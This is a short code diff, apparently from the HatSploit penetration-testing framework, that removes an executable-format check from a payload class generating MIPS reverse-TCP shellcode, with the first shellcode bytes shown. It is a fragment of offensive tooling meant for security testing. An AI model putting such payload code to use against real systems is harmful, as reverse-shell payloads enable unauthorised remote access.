@@ -74,10 +74,6 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             'lhost2': self.ip_bytes(local_host)[:2]
         }
 
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
-
         self.output_process("Generating shellcode...")
         shellcode = (
             b"\xff\xff\x04\x28"  # slti    a0,zero,-1
